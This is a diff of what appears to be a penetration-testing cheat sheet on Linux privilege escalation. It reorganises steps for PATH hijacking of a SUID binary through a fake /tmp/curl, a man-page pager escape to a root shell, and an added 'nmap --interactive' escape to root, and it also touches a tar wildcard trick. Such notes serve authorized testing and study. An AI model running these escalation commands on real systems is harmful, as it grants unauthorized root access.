@@ -754,18 +754,20 @@ lsmod
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
-
-If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
-- echo /bin/bash > /tmp/curl
-- chmod 777 /tmp/curl
-- export PATH=/tmp:$PATH
-- <path to binary>
-
 #### Run SUID BIT
 Use the following instead of just sudo <PROGRAM>
 ```
 sudo -u root <PATH TO PROGRAM> #manier1
 ./.suid_bash -p #manier2
+```
+
+#### Exploiting path on binary
+If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
+```
+echo /bin/bash > /tmp/curl
+chmod 777 /tmp/curl
+export PATH=/tmp:$PATH
+<path to binary>
 ```
   
 #### Wildcard privileges
@@ -777,10 +779,18 @@ echo "" > --checkpoint=1
 ```
 
 #### Man pages
- As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
- ```
- !/bin/bash
- ```
+As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
+```
+!/bin/bash
+```
+ 
+#### SUID nmap
+```
+nmap --interactive
+!sh
+whoami
+#root
+```
   
 ### Privesc Linux Tricks
 #### Write to /etc/passwd
